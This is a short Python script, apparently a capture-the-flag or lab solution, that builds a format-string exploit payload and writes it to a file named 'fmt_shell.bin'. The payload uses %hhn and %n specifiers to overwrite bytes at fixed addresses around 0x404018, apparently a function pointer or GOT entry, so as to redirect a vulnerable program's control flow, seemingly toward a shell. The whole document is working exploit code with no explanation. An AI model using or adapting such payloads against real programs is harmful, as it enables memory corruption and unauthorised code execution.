
#!/usr/bin/env python3

payload = b"%17X%12$hhn" + b"%47X%13$n" + b"%150X%14$hhn" + b'\x19\x40\x40' + \
    b'\0' * 5 + b'\x1a\x40\x40' + b'\0' * 5 + b'\x18\x40\x40' + b'\0' * 5

with open("fmt_shell.bin", "wb") as f:
    f.write(payload)
